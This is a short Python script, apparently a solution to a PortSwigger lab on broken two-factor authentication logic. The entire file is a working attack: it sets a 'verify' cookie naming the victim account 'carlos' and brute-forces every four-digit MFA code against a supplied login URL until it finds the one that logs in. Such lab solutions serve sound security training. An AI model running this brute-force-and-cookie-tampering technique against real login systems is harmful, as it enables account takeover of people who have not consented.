# Created by sm6r, 2024
# Lab: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic
import requests
import sys

if len(sys.argv)!=2:
    print("Usage : solution.py LOGIN_URL")
    exit()

flag=True
url = sys.argv[1]
for i in range (10000):
                code = f"{i:04}"
                print(f"Trying  :{code}",end="\r")
                response = requests.post(url,data={'mfa-code':code},cookies={'verify':'carlos'})

                if "Your name is : " in response.text:
                    print(f"\nCode is : {code}.")
                    flag=False
                    break


if flag:
    print("Didnt find the correct code.")
